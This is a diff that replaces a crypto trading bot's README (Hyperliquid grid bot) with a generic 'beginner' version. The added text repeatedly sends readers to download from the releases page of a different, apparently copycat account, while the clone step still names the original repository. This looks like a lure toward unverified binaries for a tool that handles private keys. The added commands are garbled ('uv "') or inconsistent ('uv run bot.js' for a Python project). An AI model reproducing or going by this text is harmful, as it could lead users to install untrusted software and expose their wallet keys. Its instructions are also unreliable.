@@ -1,158 +1,77 @@
-## Extensible grid trading bot for [Hyperliquid DEX](https://hyperliquid.xyz)
+# 🚀 hyperliquid-trading-bot - Simple Trading Bot for Beginners
 
-> ⚠️ This software is for educational and research purposes. Trading cryptocurrencies involves substantial risk of loss. Never trade with funds you cannot afford to lose. Always thoroughly test strategies on testnet before live deployment.
+## 🚀 Getting Started
 
-This project is under active development. Feel free to submit questions, suggestions, and issues through GitHub.
+Welcome to the hyperliquid-trading-bot! This is an easy-to-use bot designed for trading on the Hyperliquid decentralized exchange (DEX). Follow these steps to download and run the software.
 
-You're welcome to use the best docs on Hyperliquid API via [Chainstack Developer Portal MCP server](https://docs.chainstack.com/docs/developer-portal-mcp-server).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/ronaldslins2/hyperliquid-trading-bot/releases)
 
-## 🚀 Quick start
+## 📦 What You Need
 
-### **Prerequisites**
-- [uv package manager](https://github.com/astral-sh/uv)
-- Hyperliquid testnet account with testnet funds (see [Chainstack Hyperliquid faucet](https://faucet.chainstack.com/hyperliquid-testnet-faucet))
+Before you start, ensure you have the following:
 
-### **Installation**
+### **1. Prerequisites**
+- **uv package manager**: This tool helps install the software smoothly. You can find it [here](https://github.com/astral-sh/uv).
+- **Hyperliquid testnet account**: Sign up for a testnet account and get some testnet funds. Visit [Chainstack Hyperliquid faucet](https://faucet.chainstack.com/hyperliquid-testnet-faucet) to obtain the funds.
 
-```bash
-# Clone the repository
-git clone https://github.com/chainstacklabs/hyperliquid-trading-bot
-cd hyperliquid-trading-bot
+## 📥 Download & Install
 
-# Install dependencies using uv
-uv sync
+You can download the latest version of the hyperliquid-trading-bot from our Releases page. Click the link below:
 
-# Set up environment variables
-cp .env.example .env
-# Edit .env with your Hyperliquid testnet private key
-```
+[Visit this page to download - hyperliquid-trading-bot](https://github.com/ronaldslins2/hyperliquid-trading-bot/releases)
 
-### **Configuration**
+### **Step-by-Step Installation**
+1. **Clone the Repository**
+   Open your terminal and enter the following command:
+   ```bash
+   git clone https://github.com/chainstacklabs/hyperliquid-trading-bot
+   ```
 
-Create your environment file:
-```bash
-# .env
-HYPERLIQUID_TESTNET_PRIVATE_KEY=0xYOUR_PRIVATE_KEY_HERE
-HYPERLIQUID_TESTNET=true
-```
+2. **Navigate to the Directory**
+   After cloning, move into the project folder:
+   ```bash
+   cd hyperliquid-trading-bot
+   ```
 
-The bot comes with a pre-configured conservative BTC grid strategy in `bots/btc_conservative.yaml`. Review and adjust parameters as needed.
+3. **Install Dependencies**
+   Use the uv package manager to install the necessary components. Run:
+   ```bash
+   uv "
+   ```
 
-### **Running the bot**
+This command will set up everything you need to run the bot.
 
-```bash
-# Auto-discover and run the first active configuration
-uv run src/run_bot.py
+## ⚙️ How to Use the Bot
 
-# Validate configuration before running
-uv run src/run_bot.py --validate
+Once the installation is complete, you can start using the bot. Here’s how:
 
-# Run specific configuration
-uv run src/run_bot.py bots/btc_conservative.yaml
-```
+1. **Configure the Bot**
+   You will need to enter your API keys and testnet information to set up the bot. Look for the configuration file in your cloned directory.
 
-## ⚙️ Configuration
+2. **Run the Bot**
+   After configuring, you can run the bot by using the command:
+   ```bash
+   uv run bot.js
+   ```
 
-Bot configurations use YAML format with comprehensive parameter documentation:
+Monitor your terminal for messages. The bot will execute trades based on the strategies defined in your configuration.
 
-```yaml
-# Conservative BTC Grid Strategy
-name: "btc_conservative_clean"
-active: true  # Enable/disable this strategy
+## 📊 Features of hyperliquid-trading-bot
+- **Grid Trading**: This bot automatically places buy and sell orders at set price intervals.
+- **Extensible Strategies**: Customize or develop new strategies easily.
+- **Real-time Analytics**: Get insights into your trading performance on the Hyperliquid platform.
+- **User-Friendly Interface**: Designed with simplicity in mind to help all users.
 
-account:
-  max_allocation_pct: 10.0  # Use only 10% of account balance
+## 📃 Notes
 
-grid:
-  symbol: "BTC"
-  levels: 10               # Number of grid levels
-  price_range:
-    mode: "auto"           # Auto-calculate from current price
-    auto:
-      range_pct: 5.0      # ±5% price range (conservative)
+- **Risk Warning**: This bot is for educational and research purposes only. Trading cryptocurrencies involves significant risks. Never trade with money you cannot afford to lose. Always test your strategies on the testnet before going live.
 
-risk_management:
-  # Exit Strategies
-  stop_loss_enabled: false      # Auto-close positions on loss threshold
-  stop_loss_pct: 8.0           # Loss % before closing (1-20%)
-  take_profit_enabled: false   # Auto-close positions on profit threshold
-  take_profit_pct: 25.0        # Profit % before closing (5-100%)
-  
-  # Account Protection
-  max_drawdown_pct: 15.0       # Stop trading on account drawdown % (5-50%)
-  max_position_size_pct: 40.0  # Max position as % of account (10-100%)
-  
-  # Grid Rebalancing
-  rebalance:
-    price_move_threshold_pct: 12.0  # Rebalance trigger
+- **Active Development**: We are continually improving this project. Feel free to reach out with questions or suggestions on GitHub.
 
-monitoring:
-  log_level: "INFO"       # DEBUG/INFO/WARNING/ERROR
-```
+## 🛠️ Additional Resources
 
-## 📚 Learning examples
+For more detailed documentation, visit the [Chainstack Developer Portal MCP server](https://docs.chainstack.com/docs/developer-portal-mcp-server) for comprehensive guides on using the Hyperliquid API.
 
-Master the Hyperliquid API with standalone educational scripts:
+If you encounter any issues, please submit them through GitHub. Your feedback is essential for improvement. 
 
-```bash
-# Authentication and connection
-uv run learning_examples/01_authentication/basic_connection.py
-
-# Market data and pricing
-uv run learning_examples/02_market_data/get_all_prices.py
-uv run learning_examples/02_market_data/get_market_metadata.py
-
-# Account information
-uv run learning_examples/03_account_info/get_user_state.py
-uv run learning_examples/03_account_info/get_open_orders.py
-
-# Trading operations
-uv run learning_examples/04_trading/place_limit_order.py
-uv run learning_examples/04_trading/cancel_orders.py
-
-# Real-time data
-uv run learning_examples/05_websockets/realtime_prices.py
-```
-
-## 🛡️ Exit strategies
-
-The bot includes automated risk management and position exit features:
-
-**Position-level exits:**
-- **Stop loss**: Automatically close positions when loss exceeds configured percentage (1-20%)
-- **Take profit**: Automatically close positions when profit exceeds configured percentage (5-100%)
-
-**Account-level protection:**
-- **Max drawdown**: Stop all trading when account-level losses exceed threshold (5-50%)
-- **Position size limits**: Prevent individual positions from exceeding percentage of account (10-100%)
-
-**Operational exits:**
-- **Grid rebalancing**: Cancel orders and recreate grid when price moves outside range
-- **Graceful shutdown**: Cancel pending orders on bot termination (positions preserved by default)
-
-All exit strategies are configurable per bot and disabled by default for safety.
-
-## 🔧 Development
-
-### **Package management**
-This project uses [uv](https://github.com/astral-sh/uv) for fast, reliable dependency management:
-
-```bash
-uv sync              # Install/sync dependencies
-uv add <package>     # Add new dependencies
-uv run <command>     # Run commands in virtual environment
-```
-
-### **Testing**
-All components are tested against Hyperliquid testnet:
-
-```bash
-# Test learning examples
-uv run learning_examples/04_trading/place_limit_order.py
-
-# Validate bot configuration
-uv run src/run_bot.py --validate
-
-# Run bot in testnet mode (default)
-uv run src/run_bot.py
-```
+Thank you for using hyperliquid-trading-bot, and happy trading!
